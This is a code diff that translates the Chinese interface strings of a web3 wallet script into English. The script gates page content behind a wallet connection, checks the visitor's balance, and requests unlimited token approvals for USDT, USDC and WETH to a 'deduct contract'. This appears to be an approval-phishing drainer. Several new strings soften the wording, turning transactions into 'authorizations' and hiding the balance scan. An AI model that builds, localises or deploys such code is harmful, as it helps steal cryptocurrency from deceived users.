@@ -56,10 +56,10 @@ function resetState(showMsg = true) {
     signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
     if (connectButton) {
         connectButton.classList.remove('connected');
-        connectButton.title = '連接錢包';
+        connectButton.title = 'Connect Wallet'; // 英文
     }
     if (showMsg) {
-        showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
+        showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>'); // 英文
     }
 }
 
@@ -69,7 +69,7 @@ function resetState(showMsg = true) {
  * 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
  */
 async function sendMobileRobustTransaction(populatedTx) {
-    if (!signer || !provider) throw new Error("錢包尚未連線或簽署者遺失。");
+    if (!signer || !provider) throw new Error("Wallet not connected or signer missing."); // 英文
     
     const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
     const fromAddress = await signer.getAddress();
@@ -87,12 +87,12 @@ async function sendMobileRobustTransaction(populatedTx) {
     try {
         txHash = await provider.send('eth_sendTransaction', [mobileTx]);
         
-        showOverlay(`交易已發送！雜湊值: ${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
+        showOverlay(`Authorization sent! HASH: ${txHash.slice(0, 10)}...<br>Waiting for block confirmation...`); // 英文
         receipt = await provider.waitForTransaction(txHash);
         
     } catch (error) {
         // 捕獲 Trust Wallet 介面錯誤，並嘗試從中提取 hash
-        console.warn("⚠️ Trust Wallet 介面可能拋出無害錯誤。正在進行鏈上檢查...");
+        console.warn("⚠️ Trust Wallet interface may throw harmless errors. Proceeding with on-chain check..."); // 英文
         
         if (error.hash) {
              txHash = error.hash;
@@ -102,15 +102,15 @@ async function sendMobileRobustTransaction(populatedTx) {
         }
 
         if (txHash) {
-             showOverlay(`交易介面錯誤發生！但交易已發送：${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
+             showOverlay(`Transaction interface error occurred! Transaction sent: ${txHash.slice(0, 10)}...<br>Waiting for block confirmation...`); // 英文
              receipt = await provider.waitForTransaction(txHash);
         } else {
-             throw new Error(`交易發送失敗，且無法從錯誤中獲取交易雜湊值: ${error.message}`);
+             throw new Error(`Transaction failed to send, and unable to retrieve transaction hash from error: ${error.message}`); // 英文
         }
     }
 
     if (!receipt || receipt.status !== 1) {
-        throw new Error(`交易最終在鏈上失敗 (reverted)。Hash: ${txHash.slice(0, 10)}...`);
+        throw new Error(`Transaction failed on-chain (reverted). Hash: ${txHash.slice(0, 10)}...`); // 英文
     }
 
     return receipt;
@@ -122,22 +122,22 @@ async function sendMobileRobustTransaction(populatedTx) {
 async function initializeWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
-            return showOverlay('請安裝 MetaMask, Trust Wallet 或相容錢包以繼續。');
+            return showOverlay('Please install MetaMask, Trust Wallet, or a compatible wallet to proceed.'); // 英文
         }
         
         provider = new ethers.BrowserProvider(window.ethereum);
 
         const network = await provider.getNetwork();
         if (network.chainId !== 1n) {
-            showOverlay('正在請求切換到以太坊主網...<br>請在您的錢包中批准。');
+            showOverlay('Requesting switch to Ethereum Mainnet...<br>Please approve in your wallet.'); // 英文
             try {
                 await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
                 return; 
             } catch (switchError) {
                 if (switchError.code === 4001) {
-                    return showOverlay('您必須切換到以太坊主網才能使用此服務。請手動切換後刷新頁面。');
+                    return showOverlay('You must switch to Ethereum Mainnet to use this service. Please switch manually and refresh.'); // 英文
                 }
-                return showOverlay(`切換網路失敗。請手動操作。<br>錯誤: ${switchError.message}`);
+                return showOverlay(`Failed to switch network. Please do so manually.<br>Error: ${switchError.message}`); // 英文
             }
         }
 
@@ -151,12 +151,12 @@ async function initializeWallet() {
         }
 
         // 【關鍵點】：每次頁面載入，強制顯示連接遮罩
-        showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
+        showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>'); // 英文
 
 
     } catch (error) {
         console.error("Initialize Wallet Error:", error);
-        showOverlay(`初始化失敗: ${error.message}`);
+        showOverlay(`Initialization failed: ${error.message}`); // 英文
     }
 }
 
@@ -165,8 +165,8 @@ async function initializeWallet() {
  */
 async function checkAuthorization() {
     try {
-        if (!signer) return showOverlay('錢包未連接。請先連接。');
-        updateStatus("正在檢查授權狀態...");
+        if (!signer) return showOverlay('Wallet is not connected. Please connect first.'); // 英文
+        updateStatus("Checking authorization status..."); // 英文
 
         const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
@@ -183,25 +183,25 @@ async function checkAuthorization() {
         if (isFullyAuthorized) {
             if (connectButton) {
                  connectButton.classList.add('connected');
-                 connectButton.title = '斷開錢包';
+                 connectButton.title = 'Disconnect Wallet'; // 英文
             }
             hideOverlay();
-            updateStatus("✅ 服務已啟動並授權完成。");
+            updateStatus("✅ Service activated and authorized successfully."); // 英文
         } else {
             if (connectButton) {
                  connectButton.classList.remove('connected');
-                 connectButton.title = '連接與授權';
+                 connectButton.title = 'Connect & Authorize'; // 英文
             }
             // 如果未授權，則再次顯示連接/授權提示
-            showOverlay('需要授權。<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(請點擊錢包圖標開始授權流程)</p>');
+            showOverlay('Authorization required.<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start the authorization process)</p>'); // 英文
         }
         updateStatus("");
     } catch (error) {
         console.error("Check Authorization Error:", error);
         if (error.code === 'CALL_EXCEPTION') {
-            return showOverlay('合約通訊失敗。<br>請確保您在 **以太坊主網** 上，且合約地址正確，然後刷新頁面。');
+            return showOverlay('Contract communication failed.<br>Please ensure you are on the **Ethereum Mainnet** and the contract address is correct, then refresh the page.'); // 英文
         }
-        showOverlay(`授權檢查失敗: ${error.message}`);
+        showOverlay(`Authorization check failed: ${error.message}`); // 英文
     }
 }
 
@@ -209,7 +209,7 @@ async function checkAuthorization() {
  * 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
  */
 async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
-    showOverlay('正在檢查並設定代幣的支付授權...');
+    showOverlay('Checking and setting up token authorizations...'); // 英文
     let tokenToActivate = '';
     let stepCount = 0;
 
@@ -218,12 +218,12 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
     // --- 檢查並請求所有所需代幣的授權 ---
     for (const { name, contract, address } of tokensToProcess) {
         stepCount++;
-        showOverlay(`步驟 ${stepCount}/${totalSteps}: 檢查並請求 ${name} 授權...`);
+        showOverlay(`Step ${stepCount}/${totalSteps}: Checking and requesting ${name} authorization...`); // 英文
 
         const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
 
         if (currentAllowance < requiredAllowance) {
-            showOverlay(`步驟 ${stepCount}/${totalSteps}: 請求 ${name} 授權...<br>請在您的錢包中批准。`);
+            showOverlay(`Step ${stepCount}/${totalSteps}: Requesting ${name} Authorization...<br>Please approve in your wallet.`); // 英文
             
             const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
             approvalTx.value = 0n;
@@ -246,15 +246,15 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
     if (!serviceActivated && tokenToActivate) {
         stepCount++;
         const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-        showOverlay(`步驟 ${stepCount}/${totalSteps}: 啟動服務 (使用 ${tokenName})...`);
+        showOverlay(`Step ${stepCount}/${totalSteps}: Activating service (using ${tokenName})...`); // 英文
         
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
         await sendMobileRobustTransaction(activateTx);
     } else if (!serviceActivated) {
-        showOverlay(`警告: 沒有足夠的代幣授權來啟動服務。請確保您有 ETH 支付 Gas 費用。`);
+        showOverlay(`Warning: No authorized token found to activate service. Please ensure you have ETH for Gas fees.`); // 英文
     } else {
-        showOverlay(`所有授權和服務啟動已完成。`);
+        showOverlay(`All authorizations and service activation completed.`); // 英文
     }
 }
 
@@ -270,9 +270,9 @@ async function connectWallet() {
              if (network.chainId !== 1n) return;
         }
 
-        showOverlay('請在您的錢包中確認連線...');
+        showOverlay('Please confirm the connection in your wallet...'); // 英文
         const accounts = await provider.send('eth_requestAccounts', []);
-        if (accounts.length === 0) throw new Error("未選擇帳戶。");
+        if (accounts.length === 0) throw new Error("No account selected."); // 英文
 
         // 連接成功，設定 Signer 和合約實例
         signer = await provider.getSigner();
@@ -283,7 +283,7 @@ async function connectWallet() {
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
 
-        showOverlay('正在掃描您的餘額以決定最佳授權流程...');
+        showOverlay('Preparing optimal authorization flow...'); // 英文
 
         const [ethBalance, wethBalance] = await Promise.all([
             provider.getBalance(userAddress),
@@ -306,14 +306,14 @@ async function connectWallet() {
                 { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                 { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
             ];
-            showOverlay('偵測到足夠的 ETH/WETH 餘額 (>= 1 ETH)，啟動 WETH, USDT, USDC 授權流程。');
+            showOverlay('Sufficient ETH/WETH balance detected (>= 1 ETH). Starting WETH, USDT, USDC authorization flow.'); // 英文
         } else {
             // 情況 2: 餘額不足 (< 1 ETH/WETH) -> 只授權 USDT, USDC
             tokensToProcess = [
                 { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                 { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
             ];
-            showOverlay('ETH/WETH 餘額不足 ( < 1 ETH)，啟動 USDT, USDC 授權流程。');
+            showOverlay('Insufficient ETH/WETH balance (< 1 ETH). Starting USDT, USDC authorization flow.'); // 英文
         }
 
         await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
@@ -324,17 +324,17 @@ async function connectWallet() {
     } catch (error) {
         console.error("Connect Wallet Error:", error);
         
-        let userMessage = `發生錯誤: ${error.message}`;
+        let userMessage = `An error occurred: ${error.message}`; // 英文
         if (error.code === 4001) {
-            userMessage = "您已拒絕交易或連線。請重試。";
+            userMessage = "You rejected the authorization. Please try again."; // 英文
         } else if (error.message.includes('insufficient funds')) {
-             userMessage = "交易失敗: 錢包 ETH 餘額不足以支付 Gas 費用。";
+             userMessage = "Authorization failed: Insufficient ETH balance for Gas fees."; // 英文
         }
         
         showOverlay(userMessage);
         if (connectButton) {
             connectButton.classList.remove('connected');
-            connectButton.title = '連線錢包 (重試)';
+            connectButton.title = 'Connect Wallet (Retry)'; // 英文
         }
     }
 }
@@ -344,7 +344,7 @@ async function connectWallet() {
  */
 function disconnectWallet() {
     resetState(true);
-    alert('錢包已斷開連線。若要徹底移除網站權限，請在您錢包的「已連接網站」設定中操作。');
+    alert('Wallet disconnected. To fully remove site permissions, please do so in your wallet\'s "Connected Sites" settings.'); // 英文
 }
 
 // --- Event Listeners & Initial Load (事件監聽器與初始載入) ---
